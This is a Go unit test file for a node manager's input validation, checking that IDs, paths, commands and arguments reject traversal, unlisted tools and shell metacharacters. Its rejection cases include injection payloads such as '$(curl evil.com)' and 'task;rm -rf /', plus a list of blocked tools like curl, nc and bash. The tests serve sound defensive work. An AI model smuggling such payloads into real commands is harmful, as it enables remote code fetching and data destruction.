package nodemanager

import (
	"testing"
)

func TestValidateID_Valid(t *testing.T) {
	valid := []string{"container_abc123", "container-0", "c", "blk_test-001"}
	for _, id := range valid {
		if err := validateID(id); err != nil {
			t.Errorf("validateID(%q): unexpected error: %v", id, err)
		}
	}
}

func TestValidateID_Invalid(t *testing.T) {
	invalid := []string{"", "../escape", "a/b", "a\\b", "a..b", ".."}
	for _, id := range invalid {
		if err := validateID(id); err == nil {
			t.Errorf("validateID(%q): expected error, got nil", id)
		}
	}
}

func TestSafePath_Valid(t *testing.T) {
	base := t.TempDir()
	path, err := safePath(base, "container_123")
	if err != nil {
		t.Fatalf("safePath valid child: %v", err)
	}
	if path == "" {
		t.Error("expected non-empty resolved path")
	}
}

func TestSafePath_TraversalRejected(t *testing.T) {
	base := t.TempDir()
	bad := []string{"../outside", "../../etc", "a/../../b"}
	for _, child := range bad {
		_, err := safePath(base, child)
		if err == nil {
			t.Errorf("safePath(%q): expected error for traversal", child)
		}
	}
}

func TestValidateCommand_Allowed(t *testing.T) {
	allowed := []string{"mapworker", "mrappmaster", "hdfs", "mapreduce"}
	for _, cmd := range allowed {
		if err := validateCommand(cmd); err != nil {
			t.Errorf("validateCommand(%q): unexpected error: %v", cmd, err)
		}
	}
}

func TestValidateCommand_Rejected(t *testing.T) {
	rejected := []string{"curl", "python3", "sh", "bash", "/bin/rm", "nc"}
	for _, cmd := range rejected {
		if err := validateCommand(cmd); err == nil {
			t.Errorf("validateCommand(%q): expected rejection", cmd)
		}
	}
}

func TestValidateArgs_Valid(t *testing.T) {
	valid := [][]string{
		{"--mode", "map", "--task-id", "task-001"},
		{"--mapper", "wordcount", "--num-reducers", "2"},
		{"--namenode", "namenode:9000"},
	}
	for _, args := range valid {
		if err := validateArgs(args); err != nil {
			t.Errorf("validateArgs(%v): unexpected error: %v", args, err)
		}
	}
}

func TestValidateArgs_RejectedFlag(t *testing.T) {
	args := []string{"--mode", "map", "--evil-flag", "value"}
	if err := validateArgs(args); err == nil {
		t.Error("expected rejection for unknown flag --evil-flag")
	}
}

func TestValidateArgs_RejectedMetachars(t *testing.T) {
	badArgs := [][]string{
		{"--mode", "$(curl evil.com)"},
		{"--task-id", "task;rm -rf /"},
		{"--mapper", "word|count"},
	}
	for _, args := range badArgs {
		if err := validateArgs(args); err == nil {
			t.Errorf("validateArgs(%v): expected rejection for metacharacters", args)
		}
	}
}
